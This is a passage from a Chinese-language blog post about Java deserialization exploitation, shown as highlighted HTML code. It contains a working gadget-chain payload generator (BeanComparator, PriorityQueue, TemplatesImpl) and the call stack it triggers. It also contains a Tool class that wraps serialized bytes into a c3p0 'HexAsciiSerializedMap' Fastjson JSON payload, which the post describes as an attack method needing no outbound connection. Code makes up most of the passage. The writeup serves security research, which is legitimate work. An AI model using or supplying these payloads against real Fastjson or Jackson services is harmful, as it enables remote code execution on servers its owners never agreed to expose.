</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;(</span><span class="mi">2</span><span class="o">,</span> <span class="n">comparator</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;1&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;1&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">comparator</span><span class="o">,</span> <span class="s">&#34;property&#34;</span><span class="o">,</span> <span class="s">&#34;outputProperties&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">&#34;queue&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">obj</span><span class="o">,</span> <span class="kc">null</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;hex&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>同样的，给出调用栈</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">deserializeFromByteArray:</span><span class="mi">144</span><span class="o">,</span> <span class="n">SerializableUtils</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">mchange</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">ser</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">fromByteArray:</span><span class="mi">123</span><span class="o">,</span> <span class="n">SerializableUtils</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">mchange</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">ser</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parseUserOverridesAsString:</span><span class="mi">318</span><span class="o">,</span> <span class="n">C3P0ImplUtils</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">mchange</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">c3p0</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">vetoableChange:</span><span class="mi">110</span><span class="o">,</span> <span class="n">WrapperConnectionPoolDataSource$1</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">mchange</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">c3p0</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">fireVetoableChange:</span><span class="mi">375</span><span class="o">,</span> <span class="n">VetoableChangeSupport</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">beans</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">fireVetoableChange:</span><span class="mi">271</span><span class="o">,</span> <span class="n">VetoableChangeSupport</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">beans</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">setUserOverridesAsString:</span><span class="mi">387</span><span class="o">,</span> <span class="n">WrapperConnectionPoolDataSourceBase</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">mchange</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">c3p0</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">setValue:</span><span class="mi">96</span><span class="o">,</span> <span class="n">FieldDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">deserializer</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parseField:</span><span class="mi">118</span><span class="o">,</span> <span class="n">DefaultFieldDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">deserializer</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parseField:</span><span class="mi">1061</span><span class="o">,</span> <span class="n">JavaBeanDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">deserializer</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">deserialze:</span><span class="mi">756</span><span class="o">,</span> <span class="n">JavaBeanDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">deserializer</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">deserialze:</span><span class="mi">271</span><span class="o">,</span> <span class="n">JavaBeanDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">deserializer</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">deserialze:</span><span class="mi">267</span><span class="o">,</span> <span class="n">JavaBeanDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">deserializer</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parseObject:</span><span class="mi">370</span><span class="o">,</span> <span class="n">DefaultJSONParser</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parseObject:</span><span class="mi">523</span><span class="o">,</span> <span class="n">DefaultJSONParser</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">1335</span><span class="o">,</span> <span class="n">DefaultJSONParser</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">1301</span><span class="o">,</span> <span class="n">DefaultJSONParser</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">152</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">162</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">131</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">parseObject:</span><span class="mi">223</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="小结-2">小结</h4>
<p>这条链子很明显，是配合<code>Fastjson</code>、<code>Jackson</code>环境下不出网利用的打法</p>
<h3 id="用到的工具类">用到的工具类</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.caucho.hessian.io.HessianInput</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.caucho.hessian.io.HessianOutput</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Tool</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="nf">Tool</span><span class="o">(){}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">mode</span><span class="o">,</span> <span class="n">String</span> <span class="n">type</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="o">(</span><span class="n">type</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s">&#34;object&#34;</span> <span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">object</span> <span class="o">=</span> <span class="n">base64Encode</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">obj</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">mode</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;debug&#34;</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">                    <span class="n">deserialize</span><span class="o">((</span><span class="n">base64Decode</span><span class="o">(</span><span class="n">object</span><span class="o">)));</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s">&#34;hessian&#34;</span> <span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">hessian</span> <span class="o">=</span> <span class="n">base64Encode</span><span class="o">(</span><span class="n">hessianser</span><span class="o">(</span><span class="n">obj</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hessian</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">mode</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;debug&#34;</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">                    <span class="n">hessiandeser</span><span class="o">(</span><span class="n">base64Decode</span><span class="o">(</span><span class="n">hessian</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s">&#34;hex&#34;</span> <span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">serialize</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">hex</span> <span class="o">=</span> <span class="s">&#34;{\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;    \&#34;rand1\&#34;: {\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;        \&#34;@type\&#34;: \&#34;java.lang.Class\&#34;,\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;        \&#34;val\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;    },\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;    \&#34;rand2\&#34;: {\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;        \&#34;@type\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;,\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;        \&#34;userOverridesAsString\&#34;: \&#34;HexAsciiSerializedMap:&#34;</span> <span class="o">+</span> <span class="n">bytesToHexString</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;;\&#34;,\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;    }\n&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hex</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">mode</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;debug&#34;</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">                    <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">hex</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">deserialize</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayInputStream</span> <span class="n">byteArrayInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">byteArrayInputStream</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">hessiandeser</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayInputStream</span> <span class="n">byteArrayInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">HessianInput</span> <span class="n">hessianInput</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HessianInput</span><span class="o">(</span><span class="n">byteArrayInputStream</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">hessianInput</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">hessianser</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">HessianOutput</span> <span class="n">hessianOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HessianOutput</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">hessianOutput</span><span class="o">.</span><span class="na">getSerializerFactory</span><span class="o">().</span><span class="na">setAllowNonSerializable</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">hessianOutput</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">base64Decode</span><span class="o">(</span><span class="n">String</span> <span class="n">string</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Base64</span><span class="o">.</span><span class="na">Decoder</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">decoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">base64Encode</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Base64</span><span class="o">.</span><span class="na">Encoder</span> <span class="n">encoder</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">encoder</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesToHexString</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bArray</span><span class="o">,</span> <span class="kt">int</span> <span class="n">length</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">(</span><span class="n">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">sTemp</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">toHexString</span><span class="o">(</span><span class="mi">255</span> <span class="o">&amp;</span> <span class="n">bArray</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">sTemp</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">sTemp</span><span class="o">.</span><span class="na">toUpperCase</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">CtClass</span> <span class="nf">payload</span><span class="o">(</span><span class="n">String</span> <span class="n">string</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">AbstractTranslet</span> <span class="o">=</span> <span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class="o">;</span>
